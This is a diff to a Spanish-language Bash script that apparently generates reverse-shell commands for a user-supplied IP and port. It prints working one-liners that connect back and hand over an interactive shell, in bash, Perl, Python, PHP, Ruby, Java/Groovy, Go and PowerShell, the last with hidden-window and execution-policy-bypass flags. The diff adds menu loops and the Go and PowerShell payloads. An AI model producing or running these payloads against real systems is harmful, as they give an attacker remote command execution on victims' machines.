@@ -48,7 +48,7 @@ function banner(){
 function menu(){
     
     
-    echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
+    
     clear
     opt=0
     
@@ -84,19 +84,67 @@ function bashm(){
     clear
     echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}"
 
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; bashm
+        esac
+    done
 }
 
 function perlm(){
     clear
     echo -e "${yellow}1 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"
 
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
 
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; perlm
+        esac
+    done
 }
 
 function pym(){
     clear
     echo -e "${yellow}1 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
     echo -e "${yellow}2 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}"
+
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; pym
+        esac
+    done
 }
 
 function phpm(){
@@ -105,12 +153,44 @@ function phpm(){
     echo -e "${yellow}1 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
     echo -e "${yellow}2 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}"
     
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; phpm
+        esac
+    done
 }
 
 function rubym(){
     clear
     echo -e "${yellow}1 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}"
 
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; rubym
+        esac
+    done
 }
 
 function javam(){
@@ -119,15 +199,77 @@ function javam(){
     echo -e "${yellow}1 » ${end}${green}\tr = Runtime.getRuntime()${end}"
     echo -e "\t${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}"
     echo -e "\t${green}p.waitFor()${end}"
+
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; javam
+        esac
+    done
 }
 
 function gom(){
     clear
+    echo -e "${yellow}1 » ${end}${green}echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${red}$aipi${end}${green}:${end}${red}$portk${end}${green}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${end}"
+    
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; gom
+        esac
+    done
 }
 
 function powerm(){
     clear
+    declare client='$client'
+    declare sendbyte='$sendbyte'
+    declare stream='$stream'
+    declare bytes='$bytes'
+    declare data='$data'
+    declare sendback2='sendback2'
+    declare sendback='$sendback'
+    declare i='$i'
     
+    echo -e "${yellow}1 » ${end}${green}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()${end}\n"
+    echo -e "${yellow}2 » ${end}${green}powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"${end}\n"
+
+    bk=0
+    while [ $bk = 0 ]
+    do
+        
+        
+
+        echo -e "${red}[>]${end}${blue} Selecciona un numero para copiar${end}"
+        echo -e "${red}[x]${blue} Back${end} ${red}[<]${end}"
+        read opc
+        case $opc in
+        #1)
+        #2)
+        x) menu; bk=1;;
+        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; powerm
+        esac
+    done
 }
 
 # FLUJO
@@ -140,5 +282,5 @@ echo -e "${end}${red}[>] Ingresa un puerto${end}${green}"
 read portt
 aipi=$ipe
 portk=$portt
-
+echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
 menu
